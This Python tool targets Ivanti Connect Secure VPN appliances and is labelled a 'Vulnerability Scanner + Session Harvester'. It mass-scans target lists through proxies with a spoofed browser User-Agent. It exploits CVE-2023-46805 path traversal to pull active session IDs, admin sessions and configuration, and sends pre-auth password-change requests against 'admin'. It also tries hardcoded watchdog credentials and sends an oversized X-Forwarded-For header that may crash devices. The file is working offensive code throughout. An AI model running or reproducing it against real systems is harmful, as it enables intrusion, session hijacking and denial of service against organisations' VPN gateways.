#!/usr/bin/env python3
"""
Ivanti Connect Secure — Vulnerability Scanner + Session Harvester

用法:
  单目标:  python3 ivanti_scanner.py https://10.0.0.1
  批量:    python3 ivanti_scanner.py -f targets.txt
  带输出:  python3 ivanti_scanner.py -f targets.txt -o results.json

  代理:    python3 ivanti_scanner.py -f targets.txt --proxy socks5://127.0.0.1:1080
  超时:    python3 ivanti_scanner.py -f targets.txt --timeout 30
  重试:    python3 ivanti_scanner.py -f targets.txt --retry 3
  自动端口: python3 ivanti_scanner.py -f targets.txt --auto-port

targets.txt 格式 (每行一个，支持多种格式):
  https://10.0.0.1
  10.0.0.2
  10.0.0.3:8443
  vpn.company.com
"""

import requests
import urllib3
import json
import sys
import ssl
import socket
import base64
import time
import re
import argparse
import concurrent.futures
from datetime import datetime

urllib3.disable_warnings()

VERSION = "3.0"

# 常见 Ivanti 端口
COMMON_PORTS = [443, 8443, 10443, 4443, 9443]

# 伪装浏览器
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def normalize_target(raw):
    """将各种格式的输入统一为 https://host:port"""
    raw = raw.strip()
    if not raw:
        return None
    # 去掉协议头
    if "://" in raw:
        scheme, rest = raw.split("://", 1)
        host_port = rest.split("/")[0]
    else:
        scheme = "https"
        host_port = raw.split("/")[0]
    # 提取host和port
    if ":" in host_port and not host_port.startswith("["):
        host, port = host_port.rsplit(":", 1)
        try:
            int(port)
        except ValueError:
            host = host_port
            port = "443"
    else:
        host = host_port
        port = "443"
    return f"https://{host}:{port}"


class IvantiScanner:
    def __init__(self, target, verbose=False, proxy=None, timeout=15,
                 retries=2, auto_port=False, ua=DEFAULT_UA):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.proxy = proxy
        self.timeout = timeout
        self.retries = retries
        self.auto_port = auto_port
        self.ua = ua
        self.host = self.target.split("://")[1].split("/")[0]
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers["User-Agent"] = self.ua
        if proxy:
            self.session.proxies = {"https": proxy, "http": proxy}
        # TLS宽松配置
        self.session.mount("https://", requests.adapters.HTTPAdapter(
            max_retries=requests.adapters.Retry(total=retries,
                                                 backoff_factor=0.5,
                                                 status_forcelist=[502, 503, 504])
        ))
        self.results = {
            "target": self.target,
            "scan_time": datetime.now().isoformat(),
            "reachable": False,
            "version": "",
            "vulns": [],
            "sessions": [],
        }

    def _get(self, path, **kw):
        try:
            kw.setdefault("timeout", self.timeout)
            return self.session.get(f"{self.target}{path}",
                                    allow_redirects=False, **kw)
        except Exception:
            return None

    def _post(self, path, **kw):
        try:
            kw.setdefault("timeout", self.timeout)
            return self.session.post(f"{self.target}{path}",
                                     allow_redirects=False, **kw)
        except Exception:
            return None

    def _raw(self, data):
        """原始socket请求（绕过requests URL规范化）。走代理时用CONNECT隧道。"""
        h = self.host.split(":")[0]
        p = int(self.host.split(":")[1]) if ":" in self.host else 443
        try:
            if self.proxy and self.proxy.startswith("socks"):
                import socks
                ptype = socks.SOCKS5 if "socks5" in self.proxy else socks.SOCKS4
                pp = self.proxy.split("://")[1]
                ph, pport = pp.split(":")
                raw_sock = socks.socksocket()
                raw_sock.set_proxy(ptype, ph, int(pport))
            elif self.proxy and self.proxy.startswith("http"):
                # HTTP CONNECT tunnel
                pp = self.proxy.replace("http://", "").replace("https://", "")
                ph, pport = pp.split(":") if ":" in pp else (pp, "8080")
                raw_sock = socket.socket()
                raw_sock.settimeout(self.timeout)
                raw_sock.connect((ph, int(pport)))
                connect_req = f"CONNECT {h}:{p} HTTP/1.1\r\nHost: {h}:{p}\r\n\r\n"
                raw_sock.send(connect_req.encode())
                connect_resp = raw_sock.recv(4096)
                if b"200" not in connect_resp[:30]:
                    raw_sock.close()
                    return None
            else:
                raw_sock = socket.socket()

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(raw_sock, server_hostname=h)
            s.settimeout(self.timeout)
            if not (self.proxy and self.proxy.startswith("http")):
                s.connect((h, p))
            s.send(data)
            resp = b""
            while True:
                try:
                    c = s.recv(4096)
                    if not c:
                        break
                    resp += c
                except Exception:
                    break
            s.close()
            return resp
        except Exception:
            return None

    def _hit(self, vid, name, severity, detail, data=None):
        self.results["vulns"].append({
            "id": vid, "name": name, "severity": severity,
            "detail": detail, "data": data,
        })

    # ──────────────────────────────────────────────
    #  Checks
    # ──────────────────────────────────────────────

    def check_reachable(self):
        r = self._get("/")
        if r is None:
            # 自动尝试其他端口
            if self.auto_port:
                orig = self.target
                base_host = self.host.split(":")[0]
                for port in COMMON_PORTS:
                    alt = f"https://{base_host}:{port}"
                    if alt == orig:
                        continue
                    self.target = alt
                    self.host = f"{base_host}:{port}"
                    r = self._get("/")
                    if r is not None:
                        if self.verbose:
                            print(f"    [*] Found on port {port}")
                        break
                else:
                    self.target = orig
                    self.host = orig.split("://")[1].split("/")[0]
                    return False
            else:
                return False

        self.results["reachable"] = True
        self.results["target"] = self.target

        # 指纹确认是Ivanti
        r2 = self._get("/dana-na/auth/url_default/welcome.cgi")
        if r2 and r2.status_code == 200:
            m = re.findall(r"(\d+\.\d+[Rr]\d+\.\d+)", r2.text)
            if m:
                self.results["version"] = m[0]
            # 确认是Ivanti (特征: DSSignInURL cookie, realm hidden field)
            if "realm" in r2.text or "DSSignInURL" in r2.text or "dana-na" in r2.text:
                self.results["is_ivanti"] = True
            else:
                self.results["is_ivanti"] = False
        elif r2 is None or r2.status_code in [404, 502, 503]:
            # 不是Ivanti
            self.results["is_ivanti"] = False
            return False

        return True

    def check_flask_auth_bypass(self):
        for path in ["/api/my-session", "/api/my-session/changepassword",
                     "/api/my-session/info", "/api/my-session/bookmarks"]:
            r = self._get(path)
            if r is None:
                continue
            if r.status_code in [200, 400, 401, 405, 500]:
                self._hit("ZD-12", "Flask Auth Bypass (service ACTIVE)",
                          "critical",
                          f"{path} -> {r.status_code}, auth bypassed, enduserportal running")
                return "active"
            if r.status_code == 404 and "NOT FOUND" in (r.reason or ""):
                self._hit("ZD-12", "Flask Auth Bypass (service offline)",
                          "high",
                          f"{path} -> Flask 404, auth bypassed but service not running")
                return "offline"
        return None

    def check_enduserportal_preauth(self):
        r = self._post("/api/my-session/changepassword", json={
            "authserver": "0", "username": "admin",
            "oldPassword": "x", "newPassword": "Aa1!aaaa"
        })
        if r and r.status_code in [200, 400, 500]:
            self._hit("ZD-12a", "Pre-Auth Password Change Endpoint",
                      "critical",
                      f"POST changepassword -> {r.status_code}: {r.text[:120]}")
            return True

        r2 = self._get("/api/my-session/info")
        if r2 and r2.status_code in [200, 401]:
            self._hit("ZD-12b", "Pre-Auth Session Info Endpoint",
                      "high",
                      f"GET info -> {r2.status_code}: {r2.text[:120]}")
            return True
        return False

    def check_session_harvest(self):
        """通过多种方式获取session — 纯外部可执行"""
        sessions = []

        # ── 方法1: CVE-2023-46805路径穿越到session端点 (R2.3) ──
        for payload in [
            "/api/v1/totp/user-backup-code/../../sessions/bulkfetch",
            "/api/v1/totp/user-backup-code/../../system/system-information",
            "/api/v1/totp/user-backup-code/../../system/active-users",
            "/api/v1/totp/user-backup-code/../../configuration",
            "/api/v1/totp/user-backup-code/../../license/keys-status",
        ]:
            resp = self._raw(
                f"GET {payload} HTTP/1.1\r\nHost: {self.host}\r\nConnection: close\r\n\r\n".encode()
            )
            if resp and b"200 OK" in resp[:50]:
                bs = resp.find(b"\r\n\r\n")
                body = resp[bs + 4:] if bs > 0 else b""
                if b"{" in body[:20] or b"[" in body[:20]:
                    ep_name = payload.split("/")[-1]
                    try:
                        data = json.loads(body)
                        if isinstance(data, list) and data:
                            for s in data:
                                sessions.append({
                                    "source": "CVE-2023-46805",
                                    "dsid": s.get("dsid", ""),
                                    "username": s.get("username", ""),
                                    "is_admin": s.get("is_admin", False),
                                    "ip": s.get("ip", ""),
                                })
                        self._hit("CVE-2023-46805",
                                  f"Path Traversal -> {ep_name}",
                                  "critical",
                                  f"{payload} -> 200 + data",
                                  data=data if not isinstance(data, list) else f"{len(data)} items")
                    except Exception:
                        self._hit("CVE-2023-46805",
                                  f"Path Traversal -> {ep_name}",
                                  "critical",
                                  f"{payload} -> 200",
                                  data=body[:200].decode(errors="replace"))

        # ── 方法2: enduserportal pre-auth session probe ──
        # /api/my-session/info — 如果服务运行且有DSID cookie
        r = self._get("/api/my-session/info")
        if r and r.status_code == 200:
            try:
                info = r.json()
                if "username" in info:
                    sessions.append({
                        "source": "enduserportal",
                        "dsid": "(current)",
                        "username": info.get("username", ""),
                        "is_admin": "admin" in info.get("username", "").lower(),
                        "ip": info.get("last_login_ip", ""),
                    })
            except Exception:
                pass

        # ── 方法3: enduserportal auth server枚举 ──
        r_cp = self._post("/api/my-session/changepassword", json={
            "authserver": "0", "username": "admin",
            "oldPassword": "x", "newPassword": "Aa1!xxxx"
        })
        if r_cp and r_cp.status_code not in [404, 302, 403]:
            # 服务活跃 — 尝试枚举auth server
            auth_servers = []
            for aid in ["0", "1", "2", "System Local", "local", "Active Directory", "LDAP"]:
                r_e = self._post("/api/my-session/changepassword", json={
                    "authserver": aid, "username": "admin",
                    "oldPassword": "x", "newPassword": "Aa1!xxxx"
                })
                if r_e and r_e.status_code == 200:
                    auth_servers.append(aid)
                elif r_e and r_e.status_code == 400:
                    # 400 = authserver参数缺失或无效
                    pass
                elif r_e and r_e.status_code == 500:
                    # 500可能=authserver有效但CMS不可达
                    auth_servers.append(f"{aid}(err)")

            if auth_servers:
                self._hit("ZD-12a", "Pre-Auth Auth Server Enumeration",
                          "high",
                          f"Auth servers found via changepassword: {auth_servers}",
                          data=auth_servers)

        # ── 方法4: CVE-2025-22457 X-Forwarded-For overflow crash detect ──
        # 发送长XFF观察是否断连(crash) vs 正常响应(patched)
        try:
            r_xff = self._get("/", headers={"X-Forwarded-For": "1" * 2048})
            r_xff2 = self._get("/", headers={"X-Forwarded-For": "1.1.1.1"})
            if r_xff is None and r_xff2 is not None:
                self._hit("CVE-2025-22457", "XFF Overflow (possible crash)",
                          "critical",
                          "Long X-Forwarded-For caused connection drop, normal XFF works")
        except Exception:
            pass

        if sessions:
            admin_sessions = [s for s in sessions if s.get("is_admin")]
            self._hit("SESSION", "Sessions Harvested",
                      "critical",
                      f"{len(sessions)} sessions ({len(admin_sessions)} admin)",
                      data=sessions)
            self.results["sessions"] = sessions
        return sessions

    def check_rbac_bypass(self):
        r = self._get("/api/v1/system/healthcheck")
        if r and r.status_code == 200:
            try:
                d = r.json()
                if "status" in d:
                    self._hit("ZD-10", "RBAC Bypass Confirmed",
                              "high", "Enable-Rbac header not sent by web binary")
                    return True
            except Exception:
                pass
        return False

    def check_eap(self):
        r = self._post("/dana-na/auth/eap-o-http",
                        headers={"Content-Type": "application/eap"},
                        data=b"\x02\x00\x00\x0a\x01test1")
        if r and r.status_code != 404:
            self._hit("ZD-01", "EAP-over-HTTP Active",
                      "high", f"EAP endpoint: {r.status_code}. OOB read on < 22.7R2.6.")
            return True
        return False

    def check_license_proto(self):
        """ZD-17: licenseserverproto.cgi pre-auth + empty password bypass"""
        def _varint(n):
            r = b''
            while n > 127:
                r += bytes([(n & 0x7F) | 0x80])
                n >>= 7
            r += bytes([n])
            return r
        def _field(num, wt, data):
            tag = _varint((num << 3) | wt)
            if wt == 0: return tag + _varint(data)
            elif wt == 2: return tag + _varint(len(data)) + data
            return b''

        # 空密码消息
        hdr = _field(1, 2, b'scan') + _field(2, 2, b'mid') + _field(5, 2, b'')
        inner = _field(1, 2, hdr) + _field(2, 0, 2) + _field(3, 2, _field(1, 2, b'req'))
        msg_empty = _field(1, 2, inner) + _field(3, 2, b'scan') + _field(4, 2, b'22.7')

        # 错误密码消息
        hdr2 = _field(1, 2, b'scan') + _field(2, 2, b'mid') + _field(5, 2, b'wrong')
        inner2 = _field(1, 2, hdr2) + _field(2, 0, 2) + _field(3, 2, _field(1, 2, b'req'))
        msg_wrong = _field(1, 2, inner2) + _field(3, 2, b'scan') + _field(4, 2, b'22.7')

        r1 = self._post("/dana-na/licenseserver/licenseserverproto.cgi",
                         headers={"Content-Type": "application/octet-stream"}, data=msg_empty)
        r2 = self._post("/dana-na/licenseserver/licenseserverproto.cgi",
                         headers={"Content-Type": "application/octet-stream"}, data=msg_wrong)

        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
            # 提取版本
            ver = ""
            try:
                raw = r1.content
                for i in range(len(raw) - 8):
                    chunk = raw[i:i+8]
                    if all(32 <= b < 127 for b in chunk) and b'R' in chunk:
                        ver = chunk.decode(errors='replace').strip('\x00')
                        break
            except Exception:
                pass

            if len(r1.content) != len(r2.content):
                self._hit("ZD-17", "License Proto Pre-Auth + Password Bypass",
                          "high",
                          f"Empty password=different response ({len(r1.content)}b vs {len(r2.content)}b). "
                          f"Pre-auth access to license handlers. No canary. Version: {ver}",
                          data={"version": ver, "empty_pw_size": len(r1.content),
                                "wrong_pw_size": len(r2.content)})
                if ver:
                    self.results["version"] = ver
                return True
            elif r1.status_code == 200:
                self._hit("ZD-17a", "License Proto Pre-Auth Accessible",
                          "medium",
                          f"licenseserverproto.cgi responds 200. Version: {ver}")
                if ver:
                    self.results["version"] = ver
                return True
        return False

    def check_oauth_ssrf(self):
        r = self._get("/dana-na/auth/oauth-consumer.cgi",
                       params={"state": "ssrf_probe"})
        if r and r.status_code == 200 and ("Invalid" in r.text or "error" in r.text.lower()):
            self._hit("ZD-09", "OAuth SSRF to localhost:7300",
                      "medium", "state param forwarded to internal OIDC service")

        # ZD-18: Pre-auth open redirect via OIDC response reflection
        # If OIDC(7300) is running, state param is reflected in error response
        # oauth-consumer.cgi extracts URL with index("http")/rindex('"') and redirects
        r2 = self._get("/dana-na/auth/oauth-consumer.cgi",
                        params={"state": "http://evil.example.com/redirect-test"})
        if r2 and r2.status_code == 302:
            loc = r2.headers.get("Location", "")
            if "evil.example.com" in loc:
                self._hit("ZD-18", "Pre-Auth Open Redirect via OAuth OIDC Reflection",
                          "high",
                          f"state=http://evil.com → Location: {loc}. OIDC reflects state in error, "
                          f"oauth-consumer.cgi extracts with index('http')/rindex('\"') and redirects.",
                          data={"location": loc})
                return True
        return False

    def check_path_traversal(self):
        for p in ["/api/v1/totp/user-backup-code/../../system/system-information",
                  "/api/v1/totp/user-backup-code/../../license/keys-status/"]:
            resp = self._raw(f"GET {p} HTTP/1.1\r\nHost: {self.host}\r\nConnection: close\r\n\r\n".encode())
            if resp and b"200 OK" in resp[:50]:
                bs = resp.find(b"\r\n\r\n")
                body = resp[bs + 4:] if bs > 0 else b""
                if b"{" in body[:20]:
                    self._hit("CVE-2023-46805", "Path Traversal Auth Bypass (UNPATCHED)",
                              "critical", f"GET {p} -> 200 + JSON",
                              data=body[:500].decode(errors="replace"))
                    return True
        return False

    def check_watchdog(self):
        r = self._get("/dana-na/auth/url_default/login.cgi",
                       params={"username": "neoteriswatchdogprocess",
                               "password": "danastreet"})
        if r and r.status_code == 200 and len(r.content) < 500:
            self._hit("ZD-06", "Hardcoded Watchdog Credentials",
                      "medium", "neoteriswatchdogprocess/danastreet accepted")
            return True
        return False

    def check_version_vulns(self):
        ver = self.results.get("version", "")
        if not ver:
            return
        m = re.match(r"(\d+)\.(\d+)[Rr](\d+)\.(\d+)", ver)
        if not m:
            return
        maj, mi, rv, pa = int(m[1]), int(m[2]), int(m[3]), int(m[4])
        if maj == 22 and mi == 7 and rv == 2:
            if pa <= 5:
                self._hit("CVE-2025-22457", f"Stack Overflow RCE (v{ver})",
                          "critical", "X-Forwarded-For stack buffer overflow, pre-auth RCE")
            if pa <= 3:
                self._hit("ZD-05", f"No Stack Canary (v{ver})",
                          "high", "All binaries compiled without canary/FORTIFY")

    # ──────────────────────────────────────────────
    #  Main scan
    # ──────────────────────────────────────────────

    def scan(self):
        if not self.check_reachable():
            return self.results

        self.check_flask_auth_bypass()
        self.check_enduserportal_preauth()
        self.check_session_harvest()
        self.check_rbac_bypass()
        self.check_eap()
        self.check_license_proto()
        self.check_oauth_ssrf()
        self.check_path_traversal()
        self.check_watchdog()
        self.check_version_vulns()

        return self.results


def print_result(r):
    vulns = r.get("vulns", [])
    sessions = r.get("sessions", [])
    if not vulns and not sessions:
        return

    ver = r.get("version") or "unknown"
    print(f"\n{'=' * 65}")
    print(f"  {r['target']}  (v{ver})")
    print(f"{'=' * 65}")

    for v in vulns:
        sev = v["severity"].upper()
        sym = {"CRITICAL": "!!", "HIGH": "! ", "MEDIUM": "* "}.get(sev, "  ")
        print(f"  [{sym}] [{sev:8}] {v['id']}: {v['name']}")
        if v.get("data") and isinstance(v["data"], (dict, list)):
            preview = json.dumps(v["data"], ensure_ascii=False)
            if len(preview) > 120:
                preview = preview[:120] + "..."
            print(f"             {preview}")
        elif v.get("detail"):
            print(f"             {v['detail'][:120]}")

    if sessions:
        print(f"\n  --- Harvested Sessions ({len(sessions)}) ---")
        for s in sessions:
            tag = "ADMIN" if s.get("is_admin") else "user "
            print(f"  [{tag}] {s.get('username','?'):15} DSID={s.get('dsid','?'):40} src={s.get('source','?')}")


def main():
    ap = argparse.ArgumentParser(
        description="Ivanti ICS Scanner + Session Harvester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://10.0.0.1
  %(prog)s -f targets.txt --proxy socks5://127.0.0.1:1080
  %(prog)s -f targets.txt --auto-port --timeout 30 --retry 3
  %(prog)s 10.0.0.1 --auto-port
  %(prog)s vpn.company.com -o results.json
        """,
    )
    ap.add_argument("target", nargs="?", help="Target (URL, IP, or hostname)")
    ap.add_argument("-f", "--file", help="Target list file")
    ap.add_argument("-o", "--output", help="JSON output file")
    ap.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
    ap.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    ap.add_argument("--proxy", help="Proxy: socks5://IP:PORT or http://IP:PORT")
    ap.add_argument("--timeout", type=int, default=15, help="Request timeout seconds (default: 15)")
    ap.add_argument("--retry", type=int, default=2, help="Retry count (default: 2)")
    ap.add_argument("--auto-port", action="store_true", help="Auto-detect port (try 443,8443,10443,4443,9443)")
    ap.add_argument("--ua", default=DEFAULT_UA, help="Custom User-Agent")
    args = ap.parse_args()

    if not args.target and not args.file:
        ap.print_help()
        sys.exit(1)

    print(f"\n  Ivanti ICS Scanner v{VERSION}")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    if args.proxy:
        print(f"  Proxy: {args.proxy}")
    if args.auto_port:
        print(f"  Auto-port: {COMMON_PORTS}")
    print()

    targets = []
    if args.file:
        with open(args.file) as f:
            raw_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        for line in raw_lines:
            normalized = normalize_target(line)
            if normalized:
                targets.append(normalized)
        print(f"  Loaded {len(targets)} targets\n")
    else:
        normalized = normalize_target(args.target)
        if normalized:
            targets = [normalized]
        else:
            print("  [-] Invalid target")
            sys.exit(1)

    all_results = []
    t0 = time.time()

    def do_scan(t):
        s = IvantiScanner(t, verbose=args.verbose, proxy=args.proxy,
                          timeout=args.timeout, retries=args.retry,
                          auto_port=args.auto_port, ua=args.ua)
        return s.scan()

    if len(targets) == 1:
        all_results.append(do_scan(targets[0]))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = {ex.submit(do_scan, t): t for t in targets}
            for fut in concurrent.futures.as_completed(futs):
                all_results.append(fut.result())

    elapsed = time.time() - t0

    # 只输出有结果的
    for r in all_results:
        print_result(r)

    # 汇总
    vuln_count = sum(1 for r in all_results if r["vulns"])
    sess_count = sum(len(r.get("sessions", [])) for r in all_results)
    admin_count = sum(1 for r in all_results for s in r.get("sessions", []) if s.get("is_admin"))
    crit_count = sum(1 for r in all_results for v in r["vulns"] if v["severity"] == "critical")

    print(f"\n{'─' * 65}")
    print(f"  Scanned {len(all_results)} targets in {elapsed:.1f}s")
    print(f"  Vulnerable: {vuln_count}  |  Critical: {crit_count}  |  Sessions: {sess_count}  |  Admin: {admin_count}")
    print(f"{'─' * 65}\n")

    if args.output:
        with open(args.output, "w") as f:
            json.dump([r for r in all_results if r["vulns"]], f, indent=2, ensure_ascii=False)
        print(f"  Saved to {args.output}\n")


if __name__ == "__main__":
    main()
